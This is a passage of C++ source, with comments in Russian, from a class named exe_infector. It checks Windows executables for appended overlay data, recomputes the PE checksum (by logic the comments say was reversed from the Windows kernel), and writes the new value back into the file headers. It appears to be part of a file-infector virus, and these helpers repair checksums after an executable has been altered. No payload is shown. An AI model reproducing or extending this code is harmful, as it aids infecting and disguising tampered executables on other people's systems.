				pSecurityDir = &((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

			break;
		case IMAGE_FILE_MACHINE_AMD64:
			dwNumberOfSections = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.NumberOfSections;
			dwSizeOfOptionalHeader = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.SizeOfOptionalHeader;
			pFirstSection = (PIMAGE_SECTION_HEADER)((SIZE_T)pNtHeaders + (SIZE_T)offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + (SIZE_T)dwSizeOfOptionalHeader);
			dwFileAligment = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.FileAlignment;
			NumberOfRvaAndSizes = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.NumberOfRvaAndSizes;

			if (IMAGE_DIRECTORY_ENTRY_SECURITY < NumberOfRvaAndSizes)
				pSecurityDir = &((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];


			break;
		}
		
		PIMAGE_SECTION_HEADER pLastSection = &pFirstSection[dwNumberOfSections - 1];
		// размер файла + по совместительству файловый офсет до оверлея
		SIZE_T dwBinarySize = (SIZE_T)pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
		SIZE_T dwAlignedBinarySize = align(dwBinarySize, dwFileAligment);
		if (pSecurityDir != nullptr)
			dwSecuritySize = pSecurityDir->Size;

#ifdef _DEBUG
		WCHAR debugOut[1024];
		wsprintfW(debugOut, L"[exe_infector::is_overlay] file size = %d, offset until end of last section = 0x%x, sec size = 0x%x, file aligment = 0x%x, aligned size = 0x%x", dwFileSize, dwBinarySize, dwSecuritySize, dwFileAligment, dwAlignedBinarySize);
#endif
		
		// однозначно нет оверлея
		if (dwFileSize <= dwAlignedBinarySize)
		{
			bRet = FALSE;
			break;
		}

		// проверим что размер оверлея больше dwSecuritySize, то есть что там есть нечто еще кроме подписи
		if ((dwFileSize - dwBinarySize) > dwSecuritySize + 16)
		{
#ifdef _DEBUG
			wcscat(debugOut, L" - HAS OVERLAY");
#endif
			bRet = TRUE;
		}
		else
		{
#ifdef _DEBUG
			wcscat(debugOut, L" - NO OVERLAY");
#endif
			bRet = FALSE;
		}
		
#ifdef _DEBUG
		WriteLog(debugOut);
#endif

	} while (FALSE);

	if (lpHeaders != nullptr)
		delete[]lpHeaders;

	return bRet;
}

BOOL exe_infector::fix_checksum(HANDLE hFile, DWORD dwArch)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	WriteLog(L"[exe_infector::fix_checksum] fixing PE checksum...");
#endif

	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	DWORD dwCheckSum = 0;
	BOOL bRet = FALSE;
	DWORD dwHeadersSize = 0;
	LPBYTE lpHeaders = nullptr;
	DWORD dwRead = 0;
	do
	{
		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		dwCheckSum = this->calc_checksum(hFile, dwArch);
		if (dwCheckSum == 0x0)
			break;

		dwHeadersSize = GetPEHeadersSize(hFile, dwArch);
		if (dwHeadersSize == 0)
			break;

		lpHeaders = new BYTE[dwHeadersSize + 1];
		if (lpHeaders == nullptr)
			break;

		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		if (!ReadFile(hFile, lpHeaders, dwHeadersSize, &dwRead, 0))
			break;

		PDWORD pdwCheckSum = this->get_checksumptr(lpHeaders, dwRead, dwArch);
		if (pdwCheckSum == nullptr)
			break;

		*pdwCheckSum = dwCheckSum;

		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		DWORD dwWritten;
		bRet = WriteFile(hFile, lpHeaders, dwRead, &dwWritten, NULL);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::fix_checksum] checksum fixed, new checksum 0x%X", dwCheckSum);
		WriteLog(debugOut);
#endif

	} while (FALSE);

	if (lpHeaders != nullptr)
		delete[]lpHeaders;

	return bRet;
}

DWORD exe_infector::calc_checksum(HANDLE hFile, DWORD dwArch)
{
	DWORD dwReadBlockSize = 2048 * 2; // размер блока в 4 КБ которыми читаем бинарный файл в память
	blob bBufferRead;
	RtlSecureZeroMemory(&bBufferRead, sizeof(bBufferRead));
	DWORD dwCheckSum = 0;
	DWORD dwOriginalFileSize = 0;

	do
	{
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize == 0)
			break;

		dwOriginalFileSize = dwFileSize;

		DWORD dwRead = 0;
		for (UINT iIter = 0; dwFileSize > 0; iIter++)
		{
			if (dwFileSize >= dwReadBlockSize)
			{
				bBufferRead.dwBufSize = dwReadBlockSize;
				bBufferRead.lpBuffer = new BYTE[dwReadBlockSize + 1];
			}
			else
			{
				bBufferRead.dwBufSize = dwFileSize;
				bBufferRead.lpBuffer = new BYTE[dwFileSize + 1];
			}

			if (bBufferRead.lpBuffer == nullptr)
				break;

			dwRead = 0;
			if (!ReadFile(hFile, bBufferRead.lpBuffer, bBufferRead.dwBufSize, &dwRead, NULL))
				break;

			// вообще в винде используется счет чексуммы в два вызова сначала до поля CheckSum в optionalheaders и далее с SubSystem до конца файла
			// но так как файл может быть любого размера, а читать его сразу в память нерелевантно, то лучше реализовать именно таким странным образом
			if (iIter == 0) // хэшсумма не изменится если просто занулим это поле в хидерах
				this->zero_checksumfield(bBufferRead.lpBuffer, dwRead, dwArch);

			dwCheckSum = ChkSum((PWORD)bBufferRead.lpBuffer, dwCheckSum, bBufferRead.dwBufSize >> 1);

			dwFileSize -= dwRead;

			// с реверса ntoskrnl!LdrVerifyMappedImageMatchesCheckSum
			// в imagehlp ChkSum обфусцирован, поэтому более доверяю ядерному аналогу
			// это для non-aligned файлов к степени двойки, потому что сумма считается по WORD'м, а последний байт непосчитан
			// проверка только в случае dwFileSize == 0, то есть когда мы посчитали весь файл
			if ((dwFileSize == 0) && ((dwOriginalFileSize & 1) != 0))
			{
#ifdef _DEBUG
				WriteLog(L"[exe_infector::calc_checksum] unaligned file, fixing checksum according to this fact");
#endif
				// считаем на основе последнего символа
				dwCheckSum = dwCheckSum + (unsigned _int8)*((char *)&bBufferRead.lpBuffer[dwRead - 1]) + ((dwCheckSum + (DWORD)(unsigned _int8)*((char*)&bBufferRead.lpBuffer[dwRead - 1])) >> 16);
			}

			delete[]bBufferRead.lpBuffer;
			RtlSecureZeroMemory(&bBufferRead, sizeof(bBufferRead));
		}
		// в ntoskrnl!LdrVerifyMappedImageMatchesChecksum при возврате из функции идет проверка CheckSum из заголовка с суммой размера файла и посчитанной ранее в цикле хэшсуммы
		dwCheckSum += dwOriginalFileSize;

	} while (FALSE);

	if (bBufferRead.lpBuffer != nullptr)
		delete[]bBufferRead.lpBuffer;

	return dwCheckSum;
}

BOOL exe_infector::zero_checksumfield(LPBYTE lpFileBuffer, DWORD dwBufferSize, DWORD dwArch)
{
	
	PDWORD pdwCheckSum = get_checksumptr(lpFileBuffer, dwBufferSize, dwArch);
	if (pdwCheckSum != nullptr)
		*pdwCheckSum = 0;

	return TRUE;
}

PDWORD exe_infector::get_checksumptr(LPBYTE lpFileBuffer, DWORD dwBufferSize, DWORD dwArch)
{
	if (lpFileBuffer == nullptr)
		return nullptr;

	if (dwBufferSize <= (offsetof(IMAGE_DOS_HEADER, e_magic) + sizeof(IMAGE_DOS_HEADER::e_magic)))
		return nullptr;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return nullptr;

	if (dwBufferSize < ((DWORD)pDosHeader->e_lfanew + offsetof(IMAGE_NT_HEADERS32, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER32, CheckSum) + sizeof(IMAGE_OPTIONAL_HEADER32::CheckSum)))
		return nullptr;

	PDWORD pdwCheckSum = nullptr;
	switch (dwArch)
	{
	case IMAGE_FILE_MACHINE_AMD64:
		pdwCheckSum = &((PIMAGE_NT_HEADERS64)((SIZE_T)pDosHeader + (SIZE_T)pDosHeader->e_lfanew))->OptionalHeader.CheckSum;
		break;
	case IMAGE_FILE_MACHINE_I386:
		pdwCheckSum = &((PIMAGE_NT_HEADERS32)((SIZE_T)pDosHeader + (SIZE_T)pDosHeader->e_lfanew))->OptionalHeader.CheckSum;
		break;
	}

	return pdwCheckSum;
}

// с реверса ChkSum из ntoskrnl, то же самое есть в imagehelp, но в обфусцированном виде
DWORD32 exe_infector::ChkSum(PWORD pwBuffer, DWORD32 dwInitialSum, DWORD dwBufferSize)
{
	DWORD dwWordExtended = 0;
	while (dwBufferSize != 0)
	{
		dwWordExtended = (DWORD)*pwBuffer; // movzx edx, word ptr [eax]
		dwBufferSize -= 1; // dec [ebp + arg0]
		dwInitialSum += dwWordExtended; // add ecx, edx / mov edx, ecx
		pwBuffer++; // два раза подряд inc eax (указатель на word++ == +=2 байта)
		dwInitialSum = HIWORD(dwInitialSum) + (WORD)dwInitialSum;
	}

	return dwInitialSum + HIWORD(dwInitialSum);
}

